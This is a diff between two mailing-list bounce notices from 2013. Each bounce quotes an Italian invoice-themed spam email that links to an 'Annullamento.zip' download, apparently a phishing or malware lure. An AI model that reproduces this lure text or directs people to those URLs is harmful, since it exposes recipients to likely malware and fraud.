@@ -1,9 +1,9 @@
-From: postmaster-ERNa7u4uiwD/PTVKMIaDyQ@public.gmane.org
+From: postmaster-ohsCnglPHPkmHH771XGohA@public.gmane.org
 Subject: Delivery Status Notification (Failure)
-Date: Wed, 27 Mar 2013 00:07:11 +0100
-Message-ID: <NPfWMuBQQ0000374a@MIHBEMP001.miur.inf>
+Date: Wed, 27 Mar 2013 10:54:44 +0100
+Message-ID: <IEAOeIiGX000001f9@mail.datasport.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============7277680233919996548=="
+Content-Type: multipart/mixed; boundary="===============5638403975090216074=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -20,91 +20,79 @@ List-Id: containers.vger.kernel.org
 This is a MIME-formatted message.  
 Portions of this message may be unreadable without a MIME-capable mail program.
 
---===============7277680233919996548==
+--===============5638403975090216074==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="9B095B5ADSN=_01CE26383DD726970002BE75MIHBEMP001.miur."
+	boundary="9B095B5ADSN=_01CE2AA957138FE4000158ADmail.datasport.i"
 
 This is a MIME-formatted message.  
 Portions of this message may be unreadable without a MIME-capable mail program.
 
---9B095B5ADSN=_01CE26383DD726970002BE75MIHBEMP001.miur.
+--9B095B5ADSN=_01CE2AA957138FE4000158ADmail.datasport.i
 Content-Type: text/plain; charset=unicode-1-1-utf-7
 
 This is an automatically generated Delivery Status Notification.
 
 Delivery to the following recipients failed.
 
-       annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org
+       pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org
 
 
 
 
---9B095B5ADSN=_01CE26383DD726970002BE75MIHBEMP001.miur.
+--9B095B5ADSN=_01CE2AA957138FE4000158ADmail.datasport.i
 Content-Type: message/delivery-status
 
-Reporting-MTA: dns;MIHBEMP001.miur.inf
-Received-From-MTA: dns;mihexmp008.miur.inf
-Arrival-Date: Wed, 27 Mar 2013 00:07:11 +0100
+Reporting-MTA: dns;mail.datasport.it
+Received-From-MTA: dns;sophos-mail.datasport_nt.sergiochiesa.it
+Arrival-Date: Wed, 27 Mar 2013 10:54:43 +0100
 
-Original-Recipient: rfc822;annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org
-Final-Recipient: rfc822;annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org
+Original-Recipient: rfc822;pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org
+Final-Recipient: rfc822;pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org
 Action: failed
-Status: 5.2.2
-X-Display-Name: Fiacchi Annamaria
+Status: 5.1.1
 
-
---9B095B5ADSN=_01CE26383DD726970002BE75MIHBEMP001.miur.
+--9B095B5ADSN=_01CE2AA957138FE4000158ADmail.datasport.i
 Content-Type: message/rfc822
 
-Received: from mihexmp008.miur.inf ([172.16.99.12]) by MIHBEMP001.miur.inf with Microsoft SMTPSVC(6.0.3790.4675);
-	 Wed, 27 Mar 2013 00:07:11 +0100
-Received: from smtp.istruzione.it ([172.16.110.31]) by mihexmp008.miur.inf with Microsoft SMTPSVC(6.0.3790.4675);
-	 Wed, 27 Mar 2013 00:05:58 +0100
-Received: from localhost (localhost.localdomain [127.0.0.1])
-	by mailgwexch01.sidi.mpi.it (Mail Service) with ESMTP id 9537D33E62
-	for <annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org>; Wed, 27 Mar 2013 00:05:58 +0100 (CET)
-X-Virus-Scanned: Content Filter at istruzione.it
-Received: from mx.sidi.istruzione.it (mph17096.sidi.mpi.it [172.16.190.215])
-	by mailgwexch01.sidi.mpi.it (Mail Service) with ESMTP id 648A433E65
-	for <annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org>; Wed, 27 Mar 2013 00:05:58 +0100 (CET)
-Received: from localhost (unknown [127.0.0.1])
-	by mx5.sidi.istruzione.it (Mail Service) with ESMTP id 0DB5210012
-	for <annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org>; Wed, 27 Mar 2013 00:05:58 +0100 (CET)
-X-Virus-Scanned: Content Filter at istruzione.it
-X-Spam-Score: 4.75
-X-Spam-Level: ****
-X-Spam-Status: No, score=4.75 tagged_above=0 required=5.5 tests=[BAYES_99=3.5,
-	FORGED_MUA_THEBAT_CS=1.15, RDNS_NONE=0.1]
+Received: from sophos-mail.datasport_nt.sergiochiesa.it ([10.0.0.14]) by mail.datasport.it with Microsoft SMTPSVC(6.0.3790.4675);
+	 Wed, 27 Mar 2013 10:54:43 +0100
+Received: from sophos-mail.datasport_nt.sergiochiesa.it (sophos-mail [127.0.0.1])
+	by localhost (Postfix) with SMTP id A892DB98044
+	for <pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org>; Wed, 27 Mar 2013 10:54:43 +0100 (CET)
 Received: from custompcs.net.au (unknown [27.50.89.71])
-	by mx5.sidi.istruzione.it (Mail Service) with ESMTP id 803271000F
-	for <annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org>; Wed, 27 Mar 2013 00:05:55 +0100 (CET)
-Received: from [27.50.89.71] by custompcs.net.au id VDMZRisH7AHD with SMTP; Tue, 26 Mar 2013 19:05:55 -0400
-Date: Tue, 26 Mar 2013 19:05:55 -0400
-From: "I" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v3.2.77.5) Home
+	by sophos-mail.datasport_nt.sergiochiesa.it (Postfix) with ESMTP id 1EC15B98021
+	for <pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org>; Wed, 27 Mar 2013 10:54:41 +0100 (CET)
+Received: from [27.50.89.71] by custompcs.net.au id 6qxlCCjsJvKc with SMTP; Wed, 27 Mar 2013 05:54:41 -0400
+Date: Wed, 27 Mar 2013 05:54:41 -0400
+From: "Supportpay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v3.7.49.6) Home
 X-Priority: 3 (Normal)
-Message-ID: <9226352787.62197566888107-tZDOFUKzIplqFZ3NbRY2NA@public.gmane.org>
-To: <annamaria.fiacchi-yViCv/G/lLC34Msakav8EA@public.gmane.org>
-Subject: Re[2]: Monte Biz
+Message-ID: <10471412.63372354523816-tZDOFUKzIplqFZ3NbRY2NA@public.gmane.org>
+To: <pasini-nssL4BiUmrkmHH771XGohA@public.gmane.org>
+Subject: Re: document 85632752
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
+X-PMX-Version: 5.6.1.2065439, Antispam-Engine: 2.7.2.376379, Antispam-Data: 2013.3.13.181817
+X-PMX-Spam: Gauge=XXXXXXX, Probability=70%, Report='
+ FORGED_RCVD_BREDO_URI 5, FORGED_RCVD_BREDO 1, URI_ZIP_QUERY 0.5, FROM_NAME_ONE_WORD 0.05, HTML_00_01 0.05, HTML_00_10 0.05, BODYTEXTP_SIZE_3000_LESS 0, BODY_SIZE_1000_LESS 0, BODY_SIZE_100_199 0, BODY_SIZE_2000_LESS 0, BODY_SIZE_5000_LESS 0, BODY_SIZE_7000_LESS 0, DATE_TZ_NA 0, IP_HTTP_ADDR 0, RDNS_NXDOMAIN 0, RDNS_SUSP 0, RDNS_SUSP_GENERIC 0, SMALL_BODY 0, __ANY_URI 0, __BAT_MSGID 0, __BOUNCE_CHALLENGE_SUBJ 0, __BOUNCE_NDR_SUBJ_EXEMPT 0, __CP_URI_IN_BODY 0, __CT 0, __CTE 0, __CT_TEXT_PLAIN 0, __FW_1LN_BOT_MSGID 0, __HAS_FROM 0, __HAS_MSGID 0, __HAS_X_MAILER 0, __HAS_X_PRIORITY 0, __MIME_TEXT_ONLY 0, __MIME_VERSION 0, __SANE_MSGID 0, __SPEAR_FROM_NAME_A 0, __THEBAT_MUA 0, __TO_MALFORMED_2 0, __TO_NO_NAME 0, __URI_NO_WWW 0, __URI_NS '
 Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-OriginalArrivalTime: 26 Mar 2013 23:05:58.0752 (UTC) FILETIME=[7A598E00:01CE2A76]
+X-OriginalArrivalTime: 27 Mar 2013 09:54:43.0813 (UTC) FILETIME=[1B7E8150:01CE2AD1]
 Content-Transfer-Encoding: quoted-printable
 
 
-    =20
-Gentile,   =20
-Fattura         =20
-http://FIOREENATURA.COM.MX/Annullamento/Annullamento.zip
+  =20
+Buongiorno,     =20
+Fattura      =20
+http://50.63.190.129/Descrizione/Annullamento.zip?r50FrFaOh7g2yshRra=3Dpa=
+sini-nssL4BiUmrkmHH771XGohA@public.gmane.org
 
 
 
 
---9B095B5ADSN=_01CE26383DD726970002BE75MIHBEMP001.miur.--
+--9B095B5ADSN=_01CE2AA957138FE4000158ADmail.datasport.i--
 
---===============7277680233919996548==
+--===============5638403975090216074==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -114,4 +102,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============7277680233919996548==--
+--===============5638403975090216074==--
